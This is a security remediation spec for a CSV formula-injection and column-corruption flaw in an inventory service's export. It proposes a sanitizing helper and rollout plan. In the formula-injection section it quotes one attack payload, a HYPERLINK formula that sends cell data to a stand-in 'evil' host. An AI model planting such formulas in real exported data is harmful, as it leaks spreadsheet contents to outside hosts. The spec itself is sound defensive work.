# SP-3 Spec — CSV Export: Formula Injection and Structural Corruption

**Date:** 2026-06-10
**Audit Finding:** AUDIT.md SP-3
**Severity:** 🟡 Medium — formula injection when admin opens exported CSV in Excel

---

## Current State

`InventoryService.exportToExcel` (`backend/src/services/inventory.service.ts`, lines 1201–1228)
builds a CSV with raw `Array.join(',')` — no field quoting, no injection neutralization:

```typescript
[
  item.assetTag,
  item.name,
  ...
].join(',')
```

Two distinct problems:

### 1. Formula Injection
Excel and Google Sheets interpret cell values starting with `=`, `+`, `-`, `@`, `\t`, or `\r`
as formulas. Equipment names and asset tags are user-editable by any TECHNOLOGY level-2 user.
An attacker can store `=HYPERLINK("http://evil/"&A1,"x")` as a name; when an admin exports and
opens the CSV, the formula executes in the admin's spreadsheet context.

### 2. Structural Corruption
A comma, double-quote, or newline anywhere in a field value silently shifts all subsequent
columns for that row. Names, brands, and models all accept free text.

---

## Scope

Backend only — `inventory.service.ts`. No new dependencies. No schema changes. No frontend changes.

---

## Solution

Add a private `sanitizeCsvCell` helper that applies two transforms in order:

1. **Formula injection guard**: if the raw value starts with `=`, `+`, `-`, `@`, `\t`, or `\r`,
   prepend `'` (single quote — Excel treats this as a literal string prefix, preventing formula
   evaluation without altering the displayed value).

2. **RFC 4180 quoting**: escape all internal `"` by doubling (`"` → `""`), then wrap the
   entire field in `"…"`. This handles commas, newlines, and embedded quotes correctly.

### Helper

```typescript
private sanitizeCsvCell(value: string): string {
  const prefixed = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return `"${prefixed.replace(/"/g, '""')}"`;
}
```

### Usage

In `exportToExcel`, replace every raw field value with `this.sanitizeCsvCell(String(value))`.
The header row (static strings) must also be wrapped — consistent output and prevents any
future column name from accidentally starting with a special character.

---

## Implementation Plan

1. **Add `sanitizeCsvCell`** as a private method on `InventoryService`, placed immediately
   before `exportToExcel`.

2. **Update the header row** in `exportToExcel` — wrap each header string in
   `sanitizeCsvCell(...)`.

3. **Update the data rows** — replace each array element with
   `this.sanitizeCsvCell(String(<value> ?? ''))` so nulls become empty strings before
   the helper runs.

---

## Risk Assessment

| Risk | Likelihood | Mitigation |
|---|---|---|
| `'` prefix breaks downstream CSV parsing | Low — RFC 4180 parsers and Excel treat `'` as a literal character inside a quoted field; only Excel cell display is affected | Acceptable tradeoff for security; consistent with OWASP CSV injection guidance |
| Double-quoting already-quoted values | None — the helper is applied once; values are raw strings from the DB | |
| Numeric fields rendered with quotes | Low — numeric values still parse correctly in Excel when wrapped in `""` | |

---

## Notes

Documentation verification not required — this is a pure internal string-manipulation change
with no new dependencies and no external library usage.
